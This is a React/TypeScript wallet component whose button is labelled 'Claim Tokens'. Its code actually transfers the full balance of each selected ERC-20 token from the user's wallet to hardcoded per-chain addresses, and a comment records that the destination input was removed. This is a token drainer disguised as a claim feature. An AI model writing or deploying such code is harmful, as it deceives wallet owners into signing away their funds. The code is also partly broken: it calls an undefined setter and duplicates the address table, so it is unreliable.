import { Button, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

// Preset destination addresses based on chain IDs
const destinationAddresses = {
  1: '0x933d91B8D5160e302239aE916461B4DC6967815a',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815b',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815c',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815e',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815f',
  // Add other chain ID and address mappings here
};

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Function to select the correct address based on network
function selectAddressForToken(network) {
  const addresses = {
    1: "0x933d91B8D5160e302239aE916461B4DC6967815a",
    56: "0x933d91B8D5160e302239aE916461B4DC6967815b",
    10: "0x933d91B8D5160e302239aE916461B4DC6967815c",
    324: "0x933d91B8D5160e302239aE916461B4DC6967815d",
    42161: "0x933d91B8D5160e302239aE916461B4DC6967815e",
    137: "0x933d91B8D5160e302239aE916461B4DC6967815f",
    // Add other networks and their corresponding addresses
  };

  const selectedAddress = addresses[network];
  
  if (selectedAddress) {
    console.log("Great Job! Selected Address:", selectedAddress);
  } else {
    console.log("No address found for the selected network:", network);
  }

  return selectedAddress;
}

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { chain } = useAccount(); // Use chain ID from connected account

  const sendAllCheckedTokens = async () => {
    const tokensToSend: string[] = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!walletClient || !publicClient) return;

    // Automatically select destination address based on the connected chain ID
    const destinationAddress = destinationAddresses[chain?.id];
    if (!destinationAddress) {
      showToast('Unsupported chain or no destination address found for this network', 'error');
      return;
    }

    // Integrate the function to log the selected address
    selectAddressForToken(chain?.id); 

    // Perform ENS resolution if needed
    if (destinationAddress.includes('.')) {
      try {
        const resolvedDestinationAddress = await publicClient.getEnsAddress({
          name: normalize(destinationAddress),
        });
        if (resolvedDestinationAddress) {
          setDestinationAddress(resolvedDestinationAddress);
        }
      } catch (error: unknown) {
        if (error instanceof Error) {
          showToast(`Error resolving ENS address: ${error.message}`, 'warning');
        } else {
          showToast('An unknown error occurred while resolving ENS address', 'warning');
        }
      }
      return;
    }

    // Ensure resolving the ENS name above completes
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);

      // Ensure the tokenAddress has the correct format
      const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;

      try {
        // Ensure destinationAddress is properly formatted
        const formattedDestinationAddress: `0x${string}` = destinationAddress.startsWith('0x') 
          ? destinationAddress as `0x${string}` 
          : `0x${destinationAddress}` as `0x${string}`;

        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: formattedTokenAddress,
          abi: erc20Abi,
          functionName: 'transfer',
          args: [
            formattedDestinationAddress,
            BigInt(token?.balance || '0'),
          ],
        });

        const res = await walletClient.writeContract(request);
        setCheckedRecords((old) => ({
          ...old,
          [formattedTokenAddress]: {
            ...(old[formattedTokenAddress] || { isChecked: false }),
            pendingTxn: res,
          },
        }));
      } catch (err: any) {
        showToast(
          `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
          'warning',
        );
      }
    }
  };

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        {/* Removed Input for destination address */}
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={checkedCount === 0}
          style={{ marginTop: '20px' }}
        >
          {checkedCount === 0
            ? 'Claim Tokens'
            : `Claim ${checkedCount} Tokens Now`}
        </Button>
      </form>
    </div>
  );
};
